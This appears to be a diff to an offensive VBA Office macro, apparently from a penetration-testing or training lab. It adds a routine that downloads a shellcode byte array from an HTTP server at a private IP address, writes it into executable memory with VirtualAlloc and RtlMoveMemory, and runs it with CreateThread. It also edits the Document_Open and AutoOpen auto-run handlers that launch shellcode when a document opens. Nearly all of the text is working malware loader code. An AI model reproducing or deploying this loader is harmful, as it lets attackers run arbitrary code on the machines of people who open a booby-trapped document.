@@ -2,8 +2,126 @@ Private Declare PtrSafe Function GetUserName Lib "advapi32.dll" Alias "GetUserNa
 Private Declare PtrSafe Function GetPhysicallyInstalledSystemMemory Lib "Kernel32.dll" (ByRef TotalMemoryInKilobytes As LongLong) As Boolean
 
 Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+'LPVOID VirtualAlloc(
+'  [in, optional] LPVOID lpAddress,
+'  [in]           SIZE_T dwSize,
+'  [in]           DWORD  flAllocationType,
+'  [in]           DWORD  flProtect
+');
+
 Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
+'VOID RtlMoveMemory(
+'  _Out_       VOID UNALIGNED *Destination,
+'  _In_  const VOID UNALIGNED *Source,
+'  _In_        SIZE_T         Length
+');
+
 Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
+'HANDLE CreateThread(
+'  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
+'  [in]            SIZE_T                  dwStackSize,
+'  [in]            LPTHREAD_START_ROUTINE  lpStartAddress,
+'  [in, optional]  __drv_aliasesMem LPVOID lpParameter,
+'  [in]            DWORD                   dwCreationFlags,
+'  [out, optional] LPDWORD                 lpThreadId
+');
+
+Sub TestDownloadToByteArray()
+    Dim szURL   As String
+    Dim result  As String
+    Dim http    As Object
+    Dim buf     As Variant
+
+    szURL = "http://192.168.19.128:8000/buf.txt"
+
+    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
+    http.Open "GET", szURL, False
+    http.Send
+
+    result = http.responseText
+    Set http = Nothing
+
+    buf = ParseByteArray(result)
+
+    Dim i As Long
+    Dim check As String
+    For i = 0 To UBound(buf)
+        check = check & buf(i) & " "
+    Next i
+    
+    Dim addr As LongPtr
+    
+    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
+    
+    Dim counter As Long
+    Dim data As Long
+    Dim res As LongPtr
+    
+    For counter = LBound(buf) To UBound(buf)
+        data = buf(counter)
+        res = RtlMoveMemory(addr + counter, data, 1)
+    Next counter
+    
+    res = CreateThread(0, 0, addr, 0, 0, 0)
+        
+
+End Sub
+
+Function ParseByteArray(ByVal rawText As String) As Variant
+
+    Dim cleaned As String
+    cleaned = rawText
+
+    ' Step 1: Remove "buf = Array(" or "Array(" prefix
+    Dim startPos As Long
+    startPos = InStr(cleaned, "Array(")
+    If startPos > 0 Then
+        cleaned = Mid(cleaned, startPos + 6)
+    End If
+
+    ' Step 2: Remove closing ")"
+    Dim endPos As Long
+    endPos = InStr(cleaned, ")")
+    If endPos > 0 Then
+        cleaned = Left(cleaned, endPos - 1)
+    End If
+
+    ' Step 3: Remove line continuation " _"
+    cleaned = Join(Split(cleaned, " _"), "")
+
+    ' Step 4: Remove all newlines
+    cleaned = Join(Split(cleaned, vbCrLf), "")
+    cleaned = Join(Split(cleaned, vbCr), "")
+    cleaned = Join(Split(cleaned, vbLf), "")
+
+    ' Step 5: Remove all spaces
+    cleaned = Join(Split(cleaned, " "), "")
+
+    ' Step 6: Remove trailing comma if any
+    If Right(cleaned, 1) = "," Then
+        cleaned = Left(cleaned, Len(cleaned) - 1)
+    End If
+
+    ' Step 7: Split by comma
+    Dim parts() As String
+    parts = Split(cleaned, ",")
+
+    ' Step 8: Build Variant array of bytes
+    Dim buf As Variant
+    ReDim buf(UBound(parts))
+
+    Dim i As Long
+    For i = 0 To UBound(parts)
+        Dim val As String
+        val = Trim(parts(i))
+        If val <> "" Then
+            buf(i) = CByte(val)
+        End If
+    Next i
+
+    ParseByteArray = buf
+
+End Function
 
 
 Function VBAShellCode()
@@ -108,7 +226,7 @@ Sub Document_Open()
     'DownloadPayload
     'PrintUname
     'PrintRam
-    VBAShellCode
+    'VBAShellCode
     
 End Sub
 
@@ -119,6 +237,6 @@ Sub AutoOpen()
     'DownloadPayload
     'PrintUname
     'PrintRam
-    VBAShellCode
+    'VBAShellCode
     
 End Sub
